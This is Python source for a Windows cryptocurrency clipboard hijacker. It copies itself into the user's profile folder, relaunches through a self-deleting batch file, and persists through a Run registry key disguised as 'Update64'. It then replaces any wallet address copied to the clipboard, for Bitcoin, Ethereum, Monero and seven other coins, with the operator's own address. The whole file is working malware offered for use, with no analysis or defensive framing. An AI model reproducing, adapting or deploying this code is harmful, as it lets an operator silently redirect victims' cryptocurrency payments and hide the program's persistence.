import pyperclip
import re
import winreg
import os
import shutil
import sys
import subprocess
from getpass import getuser

# leave addresses blank if you don't want to replace them
addresses = {
    'BTC': '',
    'ETH': '',
    'DOGE': '',
    'LTC': '',
    'XMR': '',
    'BCH': '',
    'DASH': '',
    'TRX': '',
    'XRP': '',
    'XLM': ''
}

get_file_name = os.path.basename(sys.executable)
if sys.argv[0].lower() != 'c:\\users\\' + getuser() + '\\' + get_file_name and not os.path.exists('C:\\Users\\' + getuser() + '\\' + get_file_name):
    shutil.copy2(sys.argv[0], 'C:\\Users\\' + getuser() + '\\' + get_file_name)

    with open(f'C:\\Users\\{getuser()}\\activate.bat', 'w', encoding='utf-8') as activator:
        process_name = sys.argv[0].split('\\')[-1]
        activator.write(f'pushd "C:\\Users\\{getuser()}"\ntaskkill /f /im "{process_name}"\nstart "" "{get_file_name}"\ndel "%~f0"')
    subprocess.Popen(f'C:\\Users\\{getuser()}\\activate.bat', creationflags=subprocess.CREATE_NO_WINDOW).wait()
    sys.exit(0)

def startup():
    get_file_name = os.path.basename(sys.executable)
    registry = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
    winreg.OpenKey(registry, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run')
    winreg.CreateKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run')
    registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_WRITE)
    winreg.SetValueEx(registry_key, 'Update64', 0, winreg.REG_SZ, f'{os.getcwd()}\\{get_file_name}')
    winreg.CloseKey(registry_key)
    
startup()

def match():
    clipboard = str(pyperclip.paste())
    btc_match = re.match("^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}|^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$", clipboard)
    eth_match = re.match("^0x[a-zA-F0-9]{40}$", clipboard)
    doge_match = re.match("^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$", clipboard)
    ltc_match = re.match("^([LM3]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}||ltc1[a-z0-9]{39,59})$", clipboard)
    xmr_match = re.match("^[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93}$", clipboard)
    bch_match = re.match("^((bitcoincash|bchreg|bchtest):)?(q|p)[a-z0-9]{41}$", clipboard)
    dash_match = re.match("^X[1-9A-HJ-NP-Za-km-z]{33}$", clipboard)
    trx_match = re.match("^T[A-Za-z1-9]{33}$", clipboard)
    xrp_match = re.match("^r[0-9a-zA-Z]{33}$", clipboard)
    xlm_match = re.match("^G[0-9A-Z]{40,60}$", clipboard)

    for currency, address in addresses.items():
        if eval(f'{currency.lower()}_match'):
            if address and address != clipboard:
                pyperclip.copy(address)
            break

while True:
    pyperclip.waitForNewPaste()
    match()